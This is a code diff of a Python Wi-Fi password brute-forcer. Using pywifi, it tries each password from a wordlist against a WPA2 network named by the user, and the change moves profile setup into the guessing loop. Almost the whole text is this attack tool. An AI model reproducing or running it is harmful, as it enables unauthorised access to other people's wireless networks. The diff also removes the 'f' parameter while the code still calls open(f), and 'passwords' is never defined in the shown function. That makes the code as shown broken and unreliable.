@@ -7,7 +7,7 @@ import getopt
 import argparse
 
 
-def passwords_list(f):
+def passwords_list():
     passwords = []
     with open(f, 'r', encoding='utf8') as words:
         for password in words:
@@ -16,7 +16,7 @@ def passwords_list(f):
     return passwords
 
 
-def bruteforce(f):
+def bruteforce():
     if os.getuid() != 0:
         print("You need to have root privileges to use this program. Please "
               "try again using 'sudo'.\n")
@@ -28,15 +28,16 @@ def bruteforce(f):
     wifi = pywifi.PyWiFi()
     interface = wifi.interfaces()[0]
 
-    profile = pywifi.Profile()
-    profile.ssid = input("Enter the name of the wifi network you want to try "
-                         "to bruteforce:\n")
+    wifi_name = input("Enter the name of the wifi network you want to try to "
+                      "bruteforce:\n")
     start_time = time.time()
-    profile.auth = const.AUTH_ALG_OPEN
-    profile.akm.append(const.AKM_TYPE_WPA2PSK)
-    profile.cipher = const.CIPHER_TYPE_CCMP
     for password in passwords:
         # profile.key = "rba5829qaBdk"
+        profile = pywifi.Profile()
+        profile.ssid = wifi_name
+        profile.auth = const.AUTH_ALG_OPEN
+        profile.akm.append(const.AKM_TYPE_WPA2PSK)
+        profile.cipher = const.CIPHER_TYPE_CCMP
         profile.key = password
         interface.remove_all_network_profiles()
         new_profile = interface.add_network_profile(profile)
